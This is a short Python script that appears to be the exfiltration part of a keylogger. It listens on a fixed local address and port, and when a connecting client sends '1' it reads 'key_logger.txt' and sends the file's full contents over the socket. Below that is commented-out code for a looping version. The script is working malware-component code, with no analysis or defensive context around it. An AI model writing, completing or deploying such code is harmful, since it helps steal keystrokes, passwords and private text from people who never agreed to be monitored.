import socket
import os

SEPARATOR = "<SEPARATOR>"
BUFFER_SIZE = 4096 # send 4096 bytes each time step


print(socket.gethostname())

s = socket.socket()
host="10.0.0.3"
port=12365
print(host)


s.bind((host,port))
s.listen(1)
print("Waiting for connection")

with s:
    c,addr = s.accept()
    print('server connected to',addr)
    with c:
        msg = c.recv(1024).decode()
        if (msg == "1"):
            filename = "key_logger.txt"
            with open(filename, 'rb') as f:
                sendfile = f.read()
            c.sendall(sendfile)
            print('file sent')
            s.close()








#while True:
 #   c,address=s.accept()
  #  print('Got a Connection from ',address)
   # msg = c.recv(1024).decode()
    #if (msg == "1"):
     #  filesize = os.path.getsize(filename)
      #  s.send(f"{filename}{SEPARATOR}{filesize}".encode())






        #c.send(bytes("Goodbye","utf-8"))
        #c.close()
       # break
    #else:
        #c.send(bytes("OK","utf-8"))

#print("Socket Closed")
